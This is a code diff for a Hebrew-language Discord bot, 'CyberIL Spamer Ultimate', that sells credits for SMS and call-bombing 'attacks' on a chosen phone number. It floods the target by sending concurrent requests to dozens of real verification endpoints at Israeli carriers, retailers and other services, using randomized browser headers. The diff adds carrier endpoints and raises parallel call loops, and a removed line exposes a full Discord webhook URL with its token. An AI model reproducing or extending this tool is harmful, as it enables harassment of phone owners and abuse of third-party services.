@@ -14,11 +14,14 @@ import os
 from datetime import datetime, timezone, timedelta
 import certifi
 import socket
+import urllib.parse
+from collections import defaultdict
 
+# ============ CONFIGURATION ============
 TOKEN = os.getenv("DISCORD_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
 DB_NAME = "CyberIL_Spamer"
-WEBHOOK_URL = "https://discord.com/api/webhooks/1486446745352146974/1gfqdmemwPDOxA8BfcWyuCIvd-AqRq9dceHqio4Hmug-wk7bfB0MqygPMJJVoUg7RHgS"
+WEBHOOK_URL = ""  # השאר ריק אם אין webhook
 
 PANEL_CHANNEL = 1481957038241353779
 GIFT_CHANNEL = 1485104425625325709
@@ -35,6 +38,7 @@ COLOR_DANGER = 0xED4245
 COLOR_WARNING = 0xFEE75C
 COLOR_INFO = 0x5865F2
 
+# ============ BOT SETUP ============
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = False
@@ -43,6 +47,7 @@ intents.guilds = True
 client = commands.Bot(command_prefix="!", intents=intents, heartbeat_timeout=60)
 tree = client.tree
 
+# ============ DATABASE ============
 mongo_connection = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
 database = mongo_connection[DB_NAME]
 users_collection = database["users"]
@@ -53,9 +58,12 @@ lifetime_collection = database["lifetime"]
 
 logging.basicConfig(level=logging.WARNING)
 
-active_missions = {}
+# ============ GLOBAL VARIABLES ============
+active_missions = {}  # user_id -> asyncio.Event
 cooldown_tracker = {}
 is_shutting_down = False
+stop_all_event = asyncio.Event()
+api_stats = defaultdict(int)
 
 BROWSER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
@@ -75,7 +83,10 @@ async def get_client_ip():
     except:
         return "unknown"
 
+# ============ WEBHOOK (אופציונלי) ============
 async def send_webhook_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int, ip: str):
+    if not WEBHOOK_URL:
+        return
     embed = discord.Embed(title="📊 לוג ספאם", color=0x5865F2, timestamp=datetime.now(timezone.utc))
     embed.add_field(name="👤 משתמש", value=f"{username} (`{user_id}`)", inline=False)
     embed.add_field(name="📱 מספר יעד", value=phone, inline=True)
@@ -91,6 +102,7 @@ async def send_webhook_log(user_id: int, username: str, phone: str, cost: int, s
     except:
         pass
 
+# ============ DATABASE FUNCTIONS ============
 async def fetch_balance(user_id: int) -> int:
     record = await users_collection.find_one({"_id": user_id})
     if not record:
@@ -169,6 +181,7 @@ async def save_log(user_id: int, username: str, phone: str, cost: int, success: 
     })
     await send_webhook_log(user_id, username, phone, cost, success, failed, duration, ip)
 
+# ============ HTTP REQUEST FUNCTION ============
 async def send_request(session, url, form=None, json_data=None, headers_extra=None, tag="", method="POST", data=None):
     headers = {"User-Agent": random_agent(), "Accept": "application/json, text/plain, */*", "Accept-Language": "he-IL,he;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
     if headers_extra:
@@ -199,6 +212,7 @@ async def send_request(session, url, form=None, json_data=None, headers_extra=No
     except:
         return False, tag
 
+# ============ ATMOS (38 SMS + 38 CALL) ============
 async def atmos_request(session, store_id, phone, is_call=False):
     tag = f"atmos-{store_id}-call" if is_call else f"atmos-{store_id}"
     fd = aiohttp.FormData()
@@ -214,7 +228,7 @@ async def atmos_request(session, store_id, phone, is_call=False):
     except:
         return False, tag
 
-# ============ APIs חדשים ============
+# ============ NEW APIs ============
 async def citycar_request(session, phone):
     tag = "citycar"
     formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
@@ -277,6 +291,38 @@ async def mitmachim_advanced_request(session, phone):
     headers = {"Content-Type": "application/json", "Origin": "https://mitmachim.top", "Referer": "https://mitmachim.top/register"}
     return await send_request(session, "https://mitmachim.top/api/v3/plugins/MitMValidPhone", json_data=payload, headers_extra=headers, tag=tag)
 
+# ============ CELLULAR COMPANIES ============
+async def pelephone_request(session, phone):
+    tag = "pelephone"
+    payload = {"phone": phone, "terms": True, "appId": "DIGITALMy"}
+    headers = {"Content-Type": "application/json", "Origin": "https://www.pelephone.co.il", "Referer": "https://www.pelephone.co.il/login/?u=DIGITALMy"}
+    return await send_request(session, "https://www.pelephone.co.il/login/api/login/otpphone/", json_data=payload, headers_extra=headers, tag=tag)
+
+async def cellcom_request(session, phone):
+    tag = "cellcom"
+    payload = {"phone": phone}
+    headers = {"Content-Type": "application/json", "Origin": "https://www.cellcom.co.il", "Referer": "https://www.cellcom.co.il/"}
+    return await send_request(session, "https://www.cellcom.co.il/api/auth/sms", json_data=payload, headers_extra=headers, tag=tag)
+
+async def partner_request(session, phone):
+    tag = "partner"
+    payload = {"phone": phone}
+    headers = {"Content-Type": "application/json", "Origin": "https://www.partner.co.il", "Referer": "https://www.partner.co.il/"}
+    return await send_request(session, "https://www.partner.co.il/api/register", json_data=payload, headers_extra=headers, tag=tag)
+
+async def hot_request(session, phone):
+    tag = "hot"
+    payload = {"phone": phone}
+    headers = {"Content-Type": "application/json", "Origin": "https://www.hotmobile.co.il", "Referer": "https://www.hotmobile.co.il/"}
+    return await send_request(session, "https://www.hotmobile.co.il/api/verify", json_data=payload, headers_extra=headers, tag=tag)
+
+async def bezeq_request(session, phone):
+    tag = "bezeq"
+    payload = {"phone": phone}
+    headers = {"Content-Type": "application/json", "Origin": "https://www.bezeq.co.il", "Referer": "https://www.bezeq.co.il/"}
+    return await send_request(session, "https://www.bezeq.co.il/api/auth", json_data=payload, headers_extra=headers, tag=tag)
+
+# ============ MAIN SPAM FUNCTION ============
 async def run_spam_batch(phone: str):
     raw = phone
     formatted = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
@@ -293,6 +339,7 @@ async def run_spam_batch(phone: str):
 
     connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=300)
     async with aiohttp.ClientSession(connector=connector) as s:
+        # ATMOS - 38 SMS + 38 CALL
         atmos_stores = ["1","2","3","4","5","7","8","13","15","18","21","23","24","27","28","29","33","35","48","51","56","57","59","2008","2011","2012","2014","2041","2052","2053","2056","2059","2063","2070","2073","2076","2078","2087","2088","2091"]
         
         tasks = []
@@ -307,11 +354,11 @@ async def run_spam_batch(phone: str):
         geteat_fd.add_field("phone", raw)
         geteat_fd.add_field("testing", "false")
         
-        # CITYCAR LOOP - 20 שיחות במקביל בכל סבב!
-        for _ in range(20):
+        # CITYCAR LOOP - 30 שיחות במקביל
+        for _ in range(30):
             tasks.append(citycar_request(s, raw))
         
-        # כל ה-APIs החדשים
+        # NEW APIs
         tasks.extend([
             joedelek_request(s, raw),
             golbary_request(s, raw),
@@ -322,19 +369,20 @@ async def run_spam_batch(phone: str):
             housemen_request(s, raw),
             freeivr_advanced_request(s, raw),
             mitmachim_advanced_request(s, raw),
+            pelephone_request(s, raw),
+            cellcom_request(s, raw),
+            partner_request(s, raw),
+            hot_request(s, raw),
+            bezeq_request(s, raw),
         ])
         
+        # ALL OTHER SERVICES
         tasks.extend([
             send_request(s, "https://netfree.link/api/user/verify-phone/get-call", json_data={"agreeTou": True, "phone": formatted}, headers_extra=json_headers("https://netfree.link", "https://netfree.link/welcome/"), tag="netfree"),
             send_request(s, "https://claude.ai/api/auth/send_phone_code", json_data={"phone_number": formatted}, tag="claude"),
             send_request(s, "https://delivery.oshioshi.co.il/he/auth/register-send-code", form=f"phone={raw}", tag="oshioshi"),
             send_request(s, "https://middleware.freetv.tv/api/v1/send-verification-sms", json_data={"msisdn": formatted}, tag="freetv"),
             send_request(s, "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp", json_data={"type": "otp", "data": {"phone": raw}}, tag="webcut"),
-            send_request(s, "https://www.pelephone.co.il/login/api/login/otpphone/", json_data={"phone": raw, "terms": True, "appId": "DIGITALMy"}, tag="pelephone"),
-            send_request(s, "https://www.cellcom.co.il/api/auth/sms", json_data={"phone": raw}, tag="cellcom"),
-            send_request(s, "https://www.partner.co.il/api/register", json_data={"phone": raw}, tag="partner"),
-            send_request(s, "https://www.hotmobile.co.il/api/verify", json_data={"phone": raw}, tag="hot"),
-            send_request(s, "https://www.bezeq.co.il/api/auth", json_data={"phone": raw}, tag="bezeq"),
             send_request(s, "https://019sms.co.il/api/register", json_data={"phone": raw}, tag="019"),
             send_request(s, "https://www.shufersal.co.il/api/v1/auth/otp", json_data={"phone": raw}, tag="shufersal"),
             send_request(s, "https://www.rami-levy.co.il/api/auth/sms", json_data={"phone": raw}, tag="ramilevy"),
@@ -383,7 +431,6 @@ async def run_spam_batch(phone: str):
             send_request(s, "https://www.topten-fashion.com/customer/ajax/post/", form=f"form_key=H1eVw5PuOKdSD8D4&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.topten-fashion.com", "https://www.topten-fashion.com/"), tag="topten"),
             send_request(s, "https://www.intima-il.co.il/customer/ajax/post/", form=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw}", headers_extra=form_headers("https://www.intima-il.co.il", "https://www.intima-il.co.il/"), tag="intima"),
             send_request(s, "https://www.steimatzky.co.il/customer/ajax/post/", form=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw}", headers_extra=form_headers("https://www.steimatzky.co.il", "https://www.steimatzky.co.il/"), tag="steimatzky"),
-            send_request(s, "https://www.golbary.co.il/customer/ajax/post/", form=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.golbary.co.il", "https://www.golbary.co.il/"), tag="golbary2"),
             send_request(s, "https://www.lighting.co.il/customer/ajax/post/", form=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.lighting.co.il", "https://www.lighting.co.il/"), tag="lighting"),
             send_request(s, "https://www.super-pharm.co.il/api/sms", json_data={"phone": raw}, tag="superpharm"),
             send_request(s, "https://www.zap.co.il/api/auth/sms", json_data={"phone": raw}, tag="zap"),
@@ -446,6 +493,7 @@ async def run_spam_batch(phone: str):
                     success += 1
         return success
 
+# ============ UI PANELS ============
 def create_panel():
     embed = discord.Embed(title="🔥 **CYBERIL SPAMER ULTIMATE** 🔥", description="**המערכת החזקה ביותר בישראל**\n> 200+ שירותים | SMS + CALL | 1000+ חיבורים במקביל", color=COLOR_MAIN)
     embed.add_field(name="🚀 **התחל ספאם**", value="```\n1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן לתוצאות```", inline=False)
@@ -460,6 +508,7 @@ def create_gift_panel():
     embed.set_footer(text="🔥 CYBERIL SPAMER ULTIMATE 🔥")
     return embed
 
+# ============ VIEWS ============
 class StopAttack(discord.ui.View):
     def __init__(self, user_id: int):
         super().__init__(timeout=None)
@@ -495,6 +544,7 @@ class ConfirmAttack(discord.ui.View):
         self.is_running = True
         self.stop()
         await interaction.response.defer(ephemeral=True)
+        
         for _ in range(self.cost):
             if not await use_credit(self.user_id):
                 embed = discord.Embed(title="❌ אין מספיק קרדיטים", color=COLOR_DANGER)
@@ -515,7 +565,7 @@ class ConfirmAttack(discord.ui.View):
 
         try:
             while time.time() < end_time:
-                if stop_event.is_set() or is_shutting_down:
+                if stop_event.is_set() or is_shutting_down or stop_all_event.is_set():
                     break
                 success = await run_spam_batch(self.phone)
                 total_success += success
@@ -529,7 +579,7 @@ class ConfirmAttack(discord.ui.View):
 
             await apply_cooldown(self.phone)
             active_missions.pop(self.user_id, None)
-            stopped = stop_event.is_set()
+            stopped = stop_event.is_set() or stop_all_event.is_set()
             await save_log(user_id=self.user_id, username=str(interaction.user), phone=self.phone, cost=self.cost, success=total_success, failed=0, duration=self.cost * 60, ip=ip)
             bal = await format_balance(self.user_id)
             rate = int(total_success / max(1, self.cost * 60))
@@ -633,18 +683,25 @@ class MainPanel(discord.ui.View):
         embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
         await interaction.followup.send(embed=embed, ephemeral=True)
 
-    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.danger, emoji="🛑", custom_id="stop_all")
+    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.danger, emoji="🛑", custom_id="stop_all_global")
     async def stop_all_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not is_owner(interaction):
             await interaction.response.send_message("❌ רק הבעלים יכול לעצור את כל המתקפות", ephemeral=True)
             return
+        
+        stop_all_event.set()
         stopped_count = 0
         for user_id, event in list(active_missions.items()):
             if event and not event.is_set():
                 event.set()
                 stopped_count += 1
         active_missions.clear()
-        await interaction.response.send_message(embed=discord.Embed(title="🛑 כל המתקפות הופסקו", description=f"הופסקו {stopped_count} מתקפות פעילות", color=COLOR_SUCCESS), ephemeral=True)
+        
+        embed = discord.Embed(title="🛑 כל המתקפות הופסקו", description=f"הופסקו {stopped_count} מתקפות פעילות", color=COLOR_SUCCESS)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        
+        await asyncio.sleep(2)
+        stop_all_event.clear()
 
 class FreeCoins(discord.ui.View):
     def __init__(self):
@@ -668,6 +725,7 @@ class FreeCoins(discord.ui.View):
         new_bal = await format_balance(uid)
         await interaction.followup.send(embed=discord.Embed(title="🎁 קיבלת קרדיט", description=f"+1 קרדיט\n\nיתרה: {new_bal}", color=0xFFD700), ephemeral=True)
 
+# ============ STATS FUNCTIONS ============
 async def get_user_stats(user_id: int):
     pipeline = [{"$match": {"user_id": user_id}}, {"$group": {"_id": "$user_id", "total_attacks": {"$sum": 1}, "total_cost": {"$sum": "$cost"}, "total_success": {"$sum": "$success_count"}}}]
     result = await logs_collection.aggregate(pipeline).to_list(1)
@@ -693,6 +751,7 @@ async def get_top_targets(limit: int = 10):
     pipeline = [{"$group": {"_id": "$phone", "count": {"$sum": 1}, "success_total": {"$sum": "$success_count"}}}, {"$sort": {"count": -1}}, {"$limit": limit}]
     return await logs_collection.aggregate(pipeline).to_list(length=limit)
 
+# ============ EVENTS ============
 @client.event
 async def on_ready():
     await tree.sync()
@@ -739,7 +798,7 @@ async def shutdown_handler():
     active_missions.clear()
     await client.close()
 
-# ========== OWNER COMMANDS ==========
+# ============ OWNER COMMANDS ==========
 @tree.command(name="addcredit", description="[OWNER] הוסף קרדיטים")
 async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
     if not is_owner(interaction):
@@ -803,13 +862,20 @@ async def cmd_stopall(interaction: discord.Interaction):
     if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
+    
+    stop_all_event.set()
     stopped_count = 0
     for user_id, event in list(active_missions.items()):
         if event and not event.is_set():
             event.set()
             stopped_count += 1
     active_missions.clear()
-    await interaction.response.send_message(embed=discord.Embed(title="🛑 כל המתקפות הופסקו", description=f"הופסקו {stopped_count} מתקפות פעילות", color=COLOR_SUCCESS))
+    
+    embed = discord.Embed(title="🛑 כל המתקפות הופסקו", description=f"הופסקו {stopped_count} מתקפות פעילות", color=COLOR_SUCCESS)
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+    await asyncio.sleep(2)
+    stop_all_event.clear()
 
 @tree.command(name="restart", description="[OWNER] אתחל בוט")
 async def cmd_restart(interaction: discord.Interaction):
@@ -880,7 +946,7 @@ async def cmd_giveall(interaction: discord.Interaction, amount: int):
     await users_collection.update_many({}, {"$inc": {"credits": amount}})
     await interaction.followup.send(f"✅ ניתנו {amount} קרדיטים לכולם", ephemeral=True)
 
-# ========== PUBLIC COMMANDS ==========
+# ============ PUBLIC COMMANDS ==========
 @tree.command(name="credits", description="בדוק יתרת קרדיטים")
 async def cmd_credits(interaction: discord.Interaction, member: discord.Member = None):
     target = member or interaction.user
